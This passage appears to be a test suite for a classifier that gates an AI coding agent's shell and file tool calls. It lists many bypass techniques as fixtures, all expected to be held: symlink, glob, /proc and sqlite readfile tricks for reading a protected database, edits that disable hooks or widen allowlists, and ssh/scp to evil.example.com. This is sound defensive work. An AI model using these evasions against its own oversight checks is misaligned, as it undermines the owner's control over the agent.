import { describe, expect, test } from "bun:test";
import { exampleCorpProfile } from "../org-profile/fixtures/example-corp.js";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";
import { classifyToolCall, type FloorProbes } from "./classify.js";
import { FLOOR_ALLOW_OPTION, FLOOR_GATE, FLOOR_OWNER_GATE, OWNER_ONLY_CATEGORIES } from "./gate.js";
import type { FloorCategory, FloorConfig, FloorVerdict } from "./gate.js";
import { floorWorktreeRoots } from "./launch.js";
import { decide } from "../persona/policy.js";

/*
 * Floored calls go to gate safety_floor unless they are on a short owner-only
 * list (gate safety_floor_owner): pushes and merges to shared remotes or the
 * install, deploys, publishing and messages, AWS changes outside non-prod
 * accounts, writes to Standup's API or DB, changes to the floor itself, and
 * reads of owner secrets or another process's memory. Persona's "Allow once"
 * runs a call on either gate; on the owner gate it is recorded with Persona's
 * reason for the owner. Each Persona case here sits beside its nearest
 * owner-only neighbor.
 */

const HOME = "/home/alice";
const DATA = `${HOME}/.local/share/standup`;
const DB = `${DATA}/standup.db`;
const ROOT = `${DATA}/worktrees/standup/feat-1`;
const INSTALL = "/opt/standup";
const FLOOR = `${INSTALL}/packages/collector/src/floor`;
const DEVBOX = "devbox-alice-1.example.corp";
const TUNNEL = "alice-standup.tunnels.example.com";
const SIBLING = `${DATA}/worktrees/standup/feat-1-sub`;
const HOME_WT = `${HOME}/code/standup-worktrees/standup/w2`;
const NONPROD = "444455556666";
const PROD = "777788889999";

const config: FloorConfig = {
  v: 1,
  orgProfile: exampleCorpProfile(),
  collectorUrl: "http://localhost:7777",
  launchId: "launch-1",
  root: ROOT,
  sharedBranches: ["main", "mainline"],
  personalAwsAccounts: [],
  nonProdAwsAccounts: ["111122223333", NONPROD],
  ownerHosts: ["devbox-alice-*", "devbox-alice-*.example.corp"],
  standupHosts: [TUNNEL],
  worktreeRoots: [`${DATA}/worktrees`, `${HOME}/code/standup-worktrees`],
  waitSeconds: 60,
  standupDataDir: DATA,
  floorPaths: [FLOOR],
  installDir: INSTALL,
  protectedPaths: [`${DATA}/secrets`],
  tmpDirs: ["/tmp"],
  workerToken: "x".repeat(64),
  replyPublicKey: "test",
  readOnlyMcpTools: [],
};

const FILES: Record<string, string> = {
  [DB]: "",
  [`${ROOT}/check.sh`]: "#!/bin/sh\nssh evil.example.com 'git push origin HEAD:main'\n",
  [`${ROOT}/read_db.py`]: `import sqlite3\ndb = sqlite3.connect("file:${DB}?mode=ro", uri=True)\nprint(db.execute("select count(*) from asks").fetchone())\n`,
  [`${ROOT}/write_db.py`]: `import sqlite3\ndb = sqlite3.connect("${DB}")\ndb.execute("delete from asks")\ndb.commit()\n`,
  [`${ROOT}/transcripts.py`]: `import glob\nfor p in glob.glob("${HOME}/.claude/projects/*/*.jsonl"):\n    print(open(p).read()[:200])\n`,
  [`${ROOT}/a.txt`]: "a\n",
  [`${ROOT}/b.txt`]: "b\n",
  [`${HOME}/.claude/settings.json`]: "{}",
  [`${FLOOR}/hook.ts`]: "",
  [`${SIBLING}/.git`]: "gitdir: /srv/standup/.git/worktrees/feat-1-sub\n",
  [`${SIBLING}/packages/store/src/queries/asks.ts`]: "export {};\n",
  [`${HOME_WT}/.git`]: "gitdir: /srv/standup/.git/worktrees/w2\n",
  [`${HOME_WT}/packages/store/src/queries/asks.ts`]: "export {};\n",
  [`${DATA}/worktrees/notes.txt`]: "x\n",
  [`${INSTALL}/packages/store/src/queries/asks.ts`]: "export {};\n",
  [`${DB}-wal`]: "",
  [`${DB}-shm`]: "",
  [`${DATA}/standup.db.pre-055`]: "",
  [`${DATA}/backups/standup-2026-10-01.db`]: "",
  ["/tmp/standup-test-1/standup.db"]: "",
  [`${ROOT}/peek.ts`]: `import { Database } from "bun:sqlite";\nconst db = new Database("${DB}", { readonly: true });\nconsole.log(db.query("select * from persona_memory").all());\n`,
  [`${ROOT}/peek-home.ts`]: `import { Database } from "bun:sqlite";\nimport { homedir } from "os";\nimport { join } from "path";\nconst db = new Database(join(homedir(), ".local", "share", "standup", "standup.db"), { readonly: true });\nconsole.log(db.query("select * from persona_memory").all());\n`,
  [`${ROOT}/open.sql`]: `.open ${DB}\nselect * from persona_memory;\n`,
  [`${ROOT}/peek-xdg.ts`]: `import { Database } from "bun:sqlite";\nconst d = process.env.XDG_DATA_HOME ?? process.env.HOME + "/.local/share";\nconsole.log(new Database(d + "/standup/standup.db").query("select * from persona_memory").all());\n`,
  [`${ROOT}/peek-shared.ts`]: `import { Database } from "bun:sqlite";\nimport { standupDataDir } from "@standup/shared";\nconsole.log(new Database(standupDataDir() + "/standup.db").query("select 1").all());\n`,
  [`${HOME}/code/other/.git/HEAD`]: "ref: refs/heads/main\n",
  [`${HOME}/code/other/pkgs/a.ts`]: "export {};\n",
  [`${ROOT}/temp-db.ts`]: `import { Database } from "bun:sqlite";\nimport { mkdtempSync } from "fs";\nimport { tmpdir } from "os";\nimport { join } from "path";\nconst db = new Database(join(mkdtempSync(join(tmpdir(), "standup-test-")), "standup.db"));\ndb.run("create table t (x)");\nconsole.log(db.query("select count(*) from t").get());\n`,
};
const DIRS = new Set<string>([ROOT, "/tmp", "/", `${HOME}/.config/systemd/user/standup.service.d`, `${HOME}/.claude/projects`]);
for (const f of [...Object.keys(FILES), ...DIRS]) {
  for (let d = f.slice(0, f.lastIndexOf("/")); d; d = d.slice(0, d.lastIndexOf("/"))) DIRS.add(d);
}

function probes(extra: Partial<FloorProbes> = {}): Partial<FloorProbes> {
  return {
    gitBranch: () => "standup/feat-1",
    gitAlias: () => null,
    gitHooksDir: () => null,
    readFile: (p) => (p in FILES ? { ok: true, text: FILES[p]! } : { ok: false, reason: "missing" }),
    exists: (p) => p in FILES || DIRS.has(p),
    isDirectory: (p) => DIRS.has(p),
    listDir: () => [],
    realpath: (p) => (p in FILES || DIRS.has(p) ? p : null),
    homeDir: () => HOME,
    shellDefinitions: () => ({ aliases: new Map(), functions: new Map() }),
    awsAccount: () => null,
    now: () => Date.now(),
    ...extra,
  };
}

const bash = (command: string, extra?: Partial<FloorProbes>): FloorVerdict =>
  classifyToolCall({ toolName: "Bash", toolInput: { command }, cwd: ROOT }, config, probes(extra));
const tool = (toolName: string, toolInput: Record<string, unknown>): FloorVerdict =>
  classifyToolCall({ toolName, toolInput, cwd: ROOT }, config, probes());

/** The hold goes to gate safety_floor, and Persona's "Allow once" runs it with no owner card. */
function expectPersona(v: FloorVerdict, category: FloorCategory): void {
  expect(v.action).toBe("hold");
  if (v.action !== "hold") return;
  expect(v.category).toBe(category);
  expect(v.ownerOnly).toBe(false);
  expect(OWNER_ONLY_CATEGORIES.has(v.category)).toBe(false);
  const allow = decide("answer_ask", { owned: true, askKind: "ask_human", askGate: FLOOR_GATE, floorCategory: v.category, text: FLOOR_ALLOW_OPTION });
  expect(allow.rule).toBe("act");
}

/**
 * The hold goes to gate safety_floor_owner; Persona's "Allow once" runs it,
 * recorded with its reason for the owner.
 */
function expectOwner(v: FloorVerdict, category: FloorCategory): void {
  expect(v.action).toBe("hold");
  if (v.action !== "hold") return;
  expect(v.category).toBe(category);
  expect(v.ownerOnly).toBe(true);
  const allow = decide("answer_ask", { owned: true, askKind: "ask_human", askGate: FLOOR_OWNER_GATE, floorCategory: v.category, text: FLOOR_ALLOW_OPTION });
  expect(allow.rule).toBe("act");
}

/** A read of Standup's DB: owner-only floor-tamper, telling the worker to use Standup's API. */
function expectDbRead(v: FloorVerdict): void {
  expectOwner(v, "floor-tamper");
  if (v.action === "hold") expect(v.reason).toContain("workers may not read Standup's database; use Standup's API");
}

describe("ssh, scp and rsync to the owner's own dev boxes", () => {
  test("ssh to an allowlisted dev box, with or without the domain suffix, is allowed", () => {
    expect(bash(`ssh ${DEVBOX} "ls ~"`)).toEqual({ action: "allow" });
    expect(bash("ssh devbox-alice-1 uptime")).toEqual({ action: "allow" });
    expect(bash(`ssh -i ~/.ssh/id_ed25519 -o BatchMode=yes alice@${DEVBOX} uptime`)).toEqual({ action: "allow" });
  });

  test("rsync and scp to an allowlisted dev box are allowed", () => {
    expect(bash(`rsync -az ./ ${DEVBOX}:/tmp/standup/`)).toEqual({ action: "allow" });
    expect(bash(`rsync -az -e "ssh -i ~/.ssh/k" ./ ${DEVBOX}:/tmp/standup/`)).toEqual({ action: "allow" });
    expect(bash("scp a.txt devbox-alice-x:/tmp/")).toEqual({ action: "allow" });
  });

  test("ssh to a host that isn't allowlisted stays owner-only", () => {
    expectOwner(bash("ssh devbox-bob-1.example.corp uptime"), "outward");
    expectOwner(bash("ssh devbox-alice.evil.com uptime"), "outward");
    expectOwner(bash("scp a.txt evil.example.com:/tmp/"), "outward");
  });

  test("a jump host, forwarding or another config file leaves the allowlist", () => {
    expectOwner(bash(`ssh -J evil.example.com ${DEVBOX} uptime`), "outward");
    expectOwner(bash(`ssh -R 9000:localhost:22 ${DEVBOX} uptime`), "outward");
    expectOwner(bash(`ssh -o ProxyCommand="nc evil 22" ${DEVBOX} uptime`), "outward");
    expectOwner(bash(`ssh -F /tmp/cfg ${DEVBOX} uptime`), "outward");
    expectOwner(bash(`rsync -az -e "ssh -J evil.example.com" ./ ${DEVBOX}:/tmp/x/`), "outward");
  });

  test("what the remote command does is classified on its own", () => {
    expectOwner(bash(`ssh ${DEVBOX} "cd repo && git push origin HEAD"`), "outward");
    expectOwner(bash(`ssh ${DEVBOX} "cdk deploy Prod"`), "outward");
    expectOwner(bash(`ssh ${DEVBOX} aws s3 rm s3://bucket/key`), "aws");
  });

  test("an earlier local credential step doesn't attribute the remote host's AWS calls", () => {
    expectOwner(bash(`corp-creds credentials refresh --account ${NONPROD} --role ReadOnly && ssh ${DEVBOX} aws s3 rm s3://b/k`), "aws");
  });
});

describe("read-only calls to Standup's own API", () => {
  test("GET and HEAD to the collector or the owner's tunnel are allowed", () => {
    for (const command of ["curl localhost:7777/health", "curl -s http://127.0.0.1:7777/api/sessions", `curl -s https://${TUNNEL}/api/plans/pending`, "curl -sI http://localhost:7777/api/asks", "curl -s localhost:7777/api/asks -o /tmp/asks.json"]) {
      expect({ command, v: bash(command) }).toEqual({ command, v: { action: "allow" } });
    }
    expect(tool("WebFetch", { url: "http://localhost:7777/api/asks" })).toEqual({ action: "allow" });
  });

  test("writes to the API stay owner-only", () => {
    expectOwner(bash("curl -X POST localhost:7777/api/launch -d '{}'"), "collector-api");
    expectOwner(bash(`curl -s -X DELETE https://${TUNNEL}/api/asks/1`), "collector-api");
    expectOwner(bash("curl -s --json '{}' http://localhost:7777/api/asks/1/answer"), "collector-api");
    expectOwner(bash("printf 'POST /api/launch HTTP/1.1\\r\\n\\r\\n' | nc localhost 7777"), "collector-api");
  });
});

describe("Standup DB and service steps", () => {
  test("any sqlite3 on the DB, a checkpoint, a check, a select or a backup, is a read only the owner may allow", () => {
    expectDbRead(bash(`sqlite3 ${DB} "PRAGMA wal_checkpoint(TRUNCATE)"`));
    expectDbRead(bash(`sqlite3 ${DB} "PRAGMA integrity_check"`));
    expectDbRead(bash(`sqlite3 ~/.local/share/standup/standup.db ".backup /tmp/standup.bak"`));
    expectDbRead(bash(`sqlite3 ${DB} "select count(*) from asks"`));
    expectDbRead(bash(`sqlite3 ${DB} "PRAGMA wal_checkpoint; select * from persona_memory"`));
  });

  test("other writes to the DB stay owner-only", () => {
    expectOwner(bash(`sqlite3 ${DB} 'DELETE FROM asks'`), "floor-tamper");
    expectOwner(bash(`sqlite3 ${DB} "PRAGMA wal_checkpoint; UPDATE asks SET answer = 'Allow once'"`), "floor-tamper");
    expectOwner(bash(`sqlite3 ${DB} ".backup ${DATA}/standup.db"`), "floor-tamper");
    expectOwner(bash(`sqlite3 ${DB} "select writefile('/tmp/x', 'y')"`), "floor-tamper");
  });

  test("a read-only open of the DB is still a read; reading the transcripts is Persona's or runs", () => {
    expectDbRead(bash(`sqlite3 -readonly ${DB} "select * from asks"`));
    expectDbRead(bash("python3 read_db.py"));
    const transcripts = bash("python3 transcripts.py");
    if (transcripts.action === "hold") expectPersona(transcripts, transcripts.category);
  });

  test("the same script opening the DB read-write stays owner-only", () => {
    expectOwner(bash("python3 write_db.py"), "floor-tamper");
  });
});

describe("workers reading Standup's DB", () => {
  test("sqlite3 on the DB, read-only, by URI or through .open or ATTACH", () => {
    expectDbRead(bash(`sqlite3 ${DB} .dump`));
    expectDbRead(bash(`sqlite3 -readonly ${DB} "select * from persona_memory"`));
    expectDbRead(bash(`sqlite3 'file:${DB}?mode=ro' "select * from persona_memory"`));
    expectDbRead(bash(`sqlite3 ${DB}`));
    expectDbRead(bash(`sqlite3 :memory: ".open ${DB}" "select * from persona_memory"`));
    expectDbRead(bash(`sqlite3 /tmp/x.db "ATTACH '${DB}' AS s; select * from s.persona_memory"`));
    expectDbRead(bash(`echo 'select * from persona_memory;' | sqlite3 ${DB}`));
    expectDbRead(bash(`litecli ${DB}`));
  });

  test("the DB's WAL, shm, a copy beside it and the backups dir", () => {
    for (const file of [`${DB}-wal`, `${DB}-shm`, `${DATA}/standup.db.pre-055`, `${DATA}/backups/standup-2026-10-01.db`]) {
      expectDbRead(bash(`cat ${file}`));
      expectDbRead(tool("Read", { file_path: file }));
    }
    expectDbRead(bash(`strings ${DB}-wal | grep persona`));
    expectDbRead(bash(`tar -czf /tmp/b.tgz ${DATA}/backups`));
  });

  test("cp, cat and rsync of the DB, and a copy made in a temp dir", () => {
    expectDbRead(bash(`cp ${DB} /tmp/s.db`));
    expectDbRead(bash(`cp ${DB} /tmp/s.db && sqlite3 /tmp/s.db "select * from persona_memory"`));
    expectDbRead(bash(`cat ${DB} > /tmp/s.db`));
    expectDbRead(bash(`rsync -a ${DB} ${DB}-wal /tmp/c/`));
    expectDbRead(bash(`rsync -a ${DB} ${DEVBOX}:/tmp/`));
    expectDbRead(bash(`dd if=${DB} of=/tmp/s.db`));
    expectDbRead(bash(`base64 < ${DB}`));
  });

  test("bypass: a symlink to the DB, made earlier or in the same command", () => {
    const link = { realpath: (p: string) => (p === "/tmp/link.db" ? DB : p in FILES || DIRS.has(p) ? p : null), exists: (p: string) => p === "/tmp/link.db" || p in FILES || DIRS.has(p) };
    expectDbRead(bash("sqlite3 /tmp/link.db .dump", link));
    expectDbRead(bash("cat /tmp/link.db", link));
    expectDbRead(classifyToolCall({ toolName: "Read", toolInput: { file_path: "/tmp/link.db" }, cwd: ROOT }, config, probes(link)));
    expectDbRead(bash(`ln -s ${DB} /tmp/l.db && sqlite3 /tmp/l.db .dump`));
    expectDbRead(bash(`ln ${DB} /tmp/hard.db`));
  });

  test("bypass: $HOME- and ~-relative paths", () => {
    expectDbRead(bash(`sqlite3 "$HOME/.local/share/standup/standup.db" "select * from persona_memory"`));
    expectDbRead(bash(`sqlite3 \${HOME}/.local/share/standup/standup.db .dump`));
    expectDbRead(bash("cat ~/.local/share/standup/standup.db-wal"));
    expectDbRead(bash("cp $HOME/.local/share/standup/backups/standup-2026-10-01.db /tmp/"));
    expectDbRead(bash("cat $(echo ~/.local/share/standup/standup.db)"));
    expectDbRead(bash("H=$HOME; sqlite3 $H/.local/share/standup/standup.db .dump"));
  });

  test("bypass: a glob that matches the DB", () => {
    expectDbRead(bash("cat ~/.local/share/standup/*.db"));
    expectDbRead(bash("cp ~/.local/share/standup/stand* /tmp/"));
    expectDbRead(bash("sqlite3 ~/.local/share/standup/s*.db .dump"));
    expectDbRead(bash(`rsync -a ${DATA}/standup.db* /tmp/c/`));
    expectDbRead(bash("cat ~/.local/share/standup/backups/*"));
    expectDbRead(tool("Grep", { pattern: "persona", path: DATA }));
  });

  test("bypass: cd into the data dir, then a relative path", () => {
    expectDbRead(bash("cd ~/.local/share/standup && sqlite3 standup.db .dump"));
    expectDbRead(bash("cd ~/.local/share/standup; cat standup.db-wal"));
    expectDbRead(bash("cd ../../.. && cp standup.db /tmp/s.db"));
    expectDbRead(bash("cd ~/.local/share/standup/backups && cat standup-2026-10-01.db"));
    expectDbRead(bash("cd ~/.local/share/standup && grep -r persona"));
    expectDbRead(bash("cd ~/.local/share/standup && cat $(ls | head -1)"));
    expectDbRead(bash("pushd ~/.local/share/standup && cat ./standup.db"));
  });

  test("scripts that open the DB with bun:sqlite, by literal path or built from the home dir", () => {
    expectDbRead(bash("bun peek.ts"));
    expectDbRead(bash("bun run peek-home.ts"));
    expectDbRead(bash(`bun -e 'const { Database } = require("bun:sqlite"); console.log(new Database(process.env.HOME + "/.local/share/standup/standup.db").query("select * from persona_memory").all())'`));
    expectDbRead(bash(`node -e 'require("fs").copyFileSync("${DB}", "/tmp/s.db")'`));
    expectDbRead(bash(`python3 -c "import sqlite3; print(sqlite3.connect('${DB}').execute('select * from persona_memory').fetchall())"`));
  });

  test("bypass: code that opens the DB by a path relative to the cwd", () => {
    expectDbRead(bash(`python3 -c "import sqlite3; print(sqlite3.connect('../../../standup.db').execute('select * from asks').fetchall())"`));
    expectDbRead(bash(`bun -e "import {Database} from 'bun:sqlite'; console.log(new Database('../../../standup.db', {readonly: true}).query('select * from persona_memory').all())"`));
    expectDbRead(bash(`node -e "console.log(require('fs').readFileSync('../../../standup.db-wal').length)"`));
    expectDbRead(bash(`cd ../../.. && bun -e "import {Database} from 'bun:sqlite'; console.log(new Database('standup.db').query('select 1').all())"`));
    expectDbRead(bash(`node -e "require('fs').readFileSync('file:../../../standup.db')"`));
  });

  test("bypass: code that builds the DB's path in pieces or from Standup's helpers", () => {
    expectDbRead(bash(`bun -e "import {Database} from 'bun:sqlite'; new Database(Bun.env.HOME + '/.local/share/standup/' + ['standup', 'db'].join('.'))"`));
    expectDbRead(bash("bun peek-xdg.ts"));
    expectDbRead(bash("bun peek-shared.ts"));
    expectDbRead(bash(`bun -e "const fs = require('fs'); const d = require('os').homedir() + '/.local/share/standup'; for (const f of fs.readdirSync(d)) fs.readFileSync(d + '/' + f)"`));
    expectDbRead(bash(`python3 -c "import os, sqlite3; sqlite3.connect(os.path.join(os.path.expanduser('~'), '.local', 'share', 'standup', 'standup' + '.db'))"`));
    expectDbRead(bash(`python3 -c "import glob, os; print([open(p, 'rb').read() for p in glob.glob(os.path.expanduser('~/.local/share/st*/*'))])"`));
  });

  test("bypass: sqlite3 SQL that attaches an expression or reads another SQL file", () => {
    expectDbRead(bash(`sqlite3 :memory: "attach '${DATA}/stand' || 'up.db' as s; select * from s.asks"`));
    expectDbRead(bash(`sqlite3 :memory: "attach printf('%s/.local/share/standup/standup.db', '${HOME}') as s; select * from s.asks"`));
    expectDbRead(bash(`sqlite3 :memory: ".read open.sql"`));
    expectDbRead(bash(`sqlite3 -cmd ".read open.sql" :memory:`));
    expectDbRead(bash("cd ~/.local/share/standup && sqlite3 'file:standup.db?mode=ro' .dump"));
  });

  test("bypass: paths from the data dir piped through xargs or find -exec to any program", () => {
    expectDbRead(bash("find ~/.local/share/standup -maxdepth 1 -name standup.db | xargs -I{} sqlite3 {} .dump"));
    expectDbRead(bash(`find ~/.local/share/standup -maxdepth 1 -print0 | xargs -0 python3 -c "import sqlite3, sys; print(sqlite3.connect(sys.argv[1]).execute('select 1').fetchall())"`));
    expectDbRead(bash("find ~/.local/share/standup -maxdepth 1 -exec sqlite3 {} .dump \\;"));
  });

  test("bypass: a link to a dir above the data dir, then a glob through it", () => {
    expectDbRead(bash("ln -s ~/.local/share /tmp/sh"));
    const link = { realpath: (p: string) => (p === "/tmp/sh" ? `${HOME}/.local/share` : p.startsWith("/tmp/sh/") ? `${HOME}/.local/share/${p.slice(8)}` : p in FILES || DIRS.has(p) ? p : null) };
    expectDbRead(bash("cat /tmp/sh/standup/*", link));
    expectDbRead(bash("cat /tmp/sh/standup/standup.d?", link));
  });

  test("bypass: sqlite3 file functions and dot-commands that read the DB", () => {
    expectDbRead(bash(`sqlite3 :memory: "select readfile('${DB}')"`));
    expectDbRead(bash(`sqlite3 /tmp/x.db "SELECT hex(READFILE('${DB}'))"`));
    expectDbRead(bash(`echo "select readfile('${DB}');" | sqlite3`));
    expectDbRead(bash(`sqlite3 -cmd "select readfile('${DB}')" :memory:`));
    expectDbRead(bash(`cd ${DATA} && sqlite3 :memory: "select readfile('standup.db')"`));
    expectDbRead(bash(`sqlite3 :memory: "select * from fsdir('${DATA}')"`));
    expectDbRead(bash(`sqlite3 :memory: "select readfile('/home/' || 'alice/.local/share/standup/standup.db')"`));
    expectDbRead(bash(`sqlite3 /tmp/x.db ".import ${DB} t"`));
    expectDbRead(bash(`sqlite3 /tmp/x.db ".import --csv ${DB} t"`));
    expectDbRead(bash(`sqlite3 /tmp/a.sqlar ".archive -c ${DB}"`));
  });

  test("bypass: awk, sed, vim and duckdb scripts that name the DB", () => {
    expectDbRead(bash(`awk 'BEGIN{while((getline l < "${DB}")>0) print l}'`));
    expectDbRead(bash(`sed 'r ${DB}' a.txt`));
    expectDbRead(bash(`vim -es -c 'r ${DB}' -c 'w /tmp/x' -c q`));
    expectDbRead(bash(`duckdb -c "select * from sqlite_scan('${DB}', 'asks')"`));
    expect(bash("sed -n '1,5p' a.txt")).toEqual({ action: "allow" });
  });

  test("bypass: CDPATH, /proc/self/cwd and a server publishing the data dir", () => {
    expectDbRead(bash("export CDPATH=$HOME/.local/share; cd standup && cat standup.db"));
    expectDbRead(bash("CDPATH=$HOME/.local/share cd standup && cat standup.db"));
    expectDbRead(bash(`cd ${DATA} && cat /proc/self/cwd/standup.db`));
    expectDbRead(bash(`cd ${DATA} && python3 -c "print(open('/proc/self/cwd/standup.db', 'rb').read())"`));
    expectDbRead(bash(`python3 -m http.server -d ${DATA} 8000`));
    expectDbRead(bash(`docker run --rm -v ${DATA}:/d:ro alpine cat /d/standup.db`));
  });

  test("bypass: /proc/self/cwd with .. back up to the data dir", () => {
    expectDbRead(bash("cat /proc/self/cwd/../../../standup.db"));
    expectDbRead(bash("sqlite3 /proc/self/cwd/../../../standup.db .dump"));
    expectDbRead(tool("Read", { file_path: "/proc/self/cwd/../../../standup.db" }));
    expectOwner(bash("cat /proc/self/cwd/../../../secrets/token"), "floor-tamper");
    expect(bash("cat /proc/self/cwd/a.txt")).toEqual({ action: "allow" });
  });

  test("bypass: awk, sed and ed scripts that build the path, come from a file or arrive on stdin", () => {
    const files: Record<string, string> = { ...FILES, ["/tmp/s.awk"]: `BEGIN { while ((getline l < "${DB}") > 0) print l }\n`, ["/tmp/s.sed"]: `r ${DB}\n` };
    const p = { readFile: (f: string) => (f in files ? { ok: true as const, text: files[f]! } : { ok: false as const, reason: "missing" as const }), exists: (f: string) => f in files || DIRS.has(f) };
    expectDbRead(bash(`awk 'BEGIN{while((getline l < (ENVIRON["HOME"] "/.local/share/standup/standup.db"))>0) print l}'`));
    expectDbRead(bash("awk -f /tmp/s.awk", p));
    expectDbRead(bash("sed -f /tmp/s.sed a.txt", p));
    expectDbRead(bash(`echo "r ${DB}" | ed -s a.txt`));
    expect(bash("awk -F/ '{print $2}' a.txt")).toEqual({ action: "allow" });
  });

  test("bypass: sqlite3 .restore, .cd then a relative .open; .read |cmd is classified as a command", () => {
    expectDbRead(bash(`sqlite3 :memory: ".restore ${DB}" "select * from persona_memory"`));
    expectDbRead(bash(`sqlite3 :memory: ".cd ${DATA}" ".open standup.db" "select * from persona_memory"`));
    expectOwner(bash(`sqlite3 :memory: ".read '|git push origin HEAD:main'"`), "outward");
    expectOwner(bash(`sqlite3 /tmp/x.db ".once '|git push origin HEAD:main'" "select 1"`), "outward");
  });

  test("Standup's ripgrep tool pointed at the data dir", () => {
    expectDbRead(tool("mcp__standup__ripgrep", { pattern: "asks", path: DATA }));
    expect(tool("mcp__standup__ripgrep", { pattern: "asks", path: ROOT })).toEqual({ action: "allow" });
  });

  test("text that only mentions the DB's path, and commands that only stat it, aren't reads", () => {
    for (const command of [
      `git commit -m "docs: DB lives at ~/.local/share/standup/standup.db"`,
      `git commit -m "Read $HOME/.local/share/standup/backups when restoring"`,
      `echo "see ~/.local/share/standup/standup.db" >> notes.md`,
      `rg -n "~/.local/share/standup/standup.db" packages`,
      "ls -l ~/.local/share/standup/standup.db",
      `stat ${DB}`,
      `test -f ${DB} && echo yes`,
      "ls ~/.local/share/standup/backups",
    ]) {
      expect(bash(command)).toEqual({ action: "allow" });
    }
    // Sizing the data dir lists its live data: Persona's to allow, not a DB read.
    expect(bash(`du -sh ${DATA}`)).toMatchObject({ action: "hold", category: "standup-ops" });
    for (const command of [
      "cut -d / -f 2 a.txt",
      "tr -d / < a.txt",
      "paste -d / a.txt b.txt",
      `sqlite3 /tmp/t.db "select instr(path, '/') from t"`,
      `sqlite3 /tmp/t.db "select replace(p, '~', '-') from t"`,
      `git commit -m "$(cat <<'EOF'\nFloor: backups go to ~/.local/share/standup/backups\nEOF\n)"`,
      `git commit -m "Note ~/.local/share/standup/standup.db" && git log -1 $REF`,
    ]) {
      expect(bash(command)).toEqual({ action: "allow" });
    }
    const pr = bash(`gh pr create --title x --body "the DB is ~/.local/share/standup/standup.db"`);
    expect(pr.action === "hold" && pr.category).toBe("outward");
  });

  test("code that names the home dir beside a temp standup.db, and find -name over the home dir, run freely", () => {
    expect(bash(`python3 -c "import os, sqlite3; print(os.path.expanduser('~')); sqlite3.connect('/tmp/t/standup.db')"`)).toEqual({ action: "allow" });
    expect(bash(`bun -e 'console.log(process.env.HOME); const { Database } = require("bun:sqlite"); new Database("standup.db")'`)).toEqual({ action: "allow" });
    expect(bash("find ~ -maxdepth 2 -name '*.md' -exec wc -l {} +")).toEqual({ action: "allow" });
    expectDbRead(bash("find ~ -name '*.db' -exec cat {} +"));
  });

  test("a test's own temp DB and the DB's name alone run freely; listing the data dir is Persona's to allow", () => {
    expect(bash("sqlite3 /tmp/standup-test-1/standup.db 'select count(*) from t'")).toEqual({ action: "allow" });
    expect(bash("bun temp-db.ts")).toEqual({ action: "allow" });
    expect(bash("bun test packages/store")).toEqual({ action: "allow" });
    expect(bash("ls -la ~/.local/share/standup")).toMatchObject({ action: "hold", category: "standup-ops" });
    expect(tool("Glob", { pattern: "*.db", path: DATA })).toMatchObject({ action: "hold", category: "standup-ops" });
    expect(tool("Grep", { pattern: "standup.db", path: ROOT })).toEqual({ action: "allow" });
    expect(bash("grep -rn 'standup.db' packages/collector/src")).toEqual({ action: "allow" });
  });
});

describe("Standup's services", () => {

  test("systemctl --user stopping or disabling Standup's units is Persona's; starting or restarting them is allowed", () => {
    for (const command of ["systemctl --user stop standup.service", "systemctl --user kill standup", "systemctl --user disable standup-tunnel"]) {
      expectPersona(bash(command), "standup-ops");
    }
    for (const command of ["systemctl --user start standup.service", "systemctl --user restart standup-tunnel.service", "systemctl --user enable standup", "systemctl --user daemon-reload"]) {
      expect({ command, v: bash(command) }).toEqual({ command, v: { action: "allow" } });
    }
    expect(bash("systemctl --user status standup.service")).toEqual({ action: "allow" });
  });

  test("writing a drop-in or the floor's config stays owner-only", () => {
    expectOwner(tool("Write", { file_path: `${HOME}/.config/systemd/user/standup.service.d/floor.conf`, content: "[Service]\nEnvironment=STANDUP_FLOOR_OWNER_HOSTS=*\n" }), "floor-tamper");
    expectOwner(bash(`echo 'Environment=STANDUP_FLOOR_NONPROD_AWS_ACCOUNTS=${PROD}' >> ~/.config/systemd/user/standup.service.d/floor.conf`), "floor-tamper");
    expectOwner(tool("Edit", { file_path: `${FLOOR}/gate.ts`, old_string: "a", new_string: "b" }), "floor-tamper");
    expectOwner(tool("Edit", { file_path: `${HOME}/.claude/settings.json`, old_string: "{}", new_string: "{\"disableAllHooks\":true}" }), "floor-tamper");
  });
});

describe("source edits in other Standup worktrees", () => {
  test("Edit, Write and MultiEdit in a sibling worktree under either root are ordinary", () => {
    for (const wt of [SIBLING, HOME_WT]) {
      const file = `${wt}/packages/store/src/queries/asks.ts`;
      expect(tool("Edit", { file_path: file, old_string: "export {};", new_string: "export const x = 1;" })).toEqual({ action: "allow" });
      expect(tool("Write", { file_path: `${wt}/packages/store/src/queries/new.ts`, content: "export {};\n" })).toEqual({ action: "allow" });
      expect(tool("MultiEdit", { file_path: file, edits: [] })).toEqual({ action: "allow" });
    }
  });

  test("the install, its floor code, the DB and the rest of the data dir stay owner-only", () => {
    expectOwner(tool("Edit", { file_path: `${INSTALL}/packages/store/src/queries/asks.ts`, old_string: "a", new_string: "b" }), "floor-tamper");
    expectOwner(tool("Write", { file_path: `${FLOOR}/classify.ts`, content: "" }), "floor-tamper");
    expectOwner(tool("Write", { file_path: DB, content: "" }), "floor-tamper");
    expectOwner(tool("Write", { file_path: `${DATA}/internal/persona/notes.md`, content: "" }), "floor-tamper");
    expectOwner(tool("Write", { file_path: `${SIBLING}/.claude/settings.json`, content: "{}" }), "floor-tamper");
  });

  test("git's files, .claude/ and the git hook dirs inside a sibling worktree are not source edits", () => {
    for (const file of [`.git`, `.git/HEAD`, `.git/hooks/pre-commit`, `.claude/commands/ship.md`, `.claude/settings.local.json`, `.husky/pre-commit`, `packages/x/.githooks/pre-push`]) {
      expect(tool("Write", { file_path: `${SIBLING}/${file}`, content: "git push origin HEAD:main\n" }).action).toBe("hold");
    }
    expect(tool("Write", { file_path: `${HOME_WT}/.git`, content: "gitdir: /tmp/evil\n" }).action).toBe("hold");
    expectOwner(tool("Write", { file_path: `${HOME_WT}/.claude/settings.local.json`, content: "{}" }), "floor-tamper");
    expect(tool("Write", { file_path: `${HOME_WT}/.git/hooks/pre-commit`, content: "git push\n" }).action).toBe("hold");
  });

  test("control dirs match in any case", () => {
    expect(tool("Write", { file_path: `${SIBLING}/.Claude/settings.json`, content: "{}" }).action).toBe("hold");
    expect(tool("Write", { file_path: `${SIBLING}/.GIT/hooks/pre-commit`, content: "git push\n" }).action).toBe("hold");
  });

  test("git init or clone into Standup's data dir outside worktrees/ is held, so it can't plant a checkout", () => {
    for (const command of [
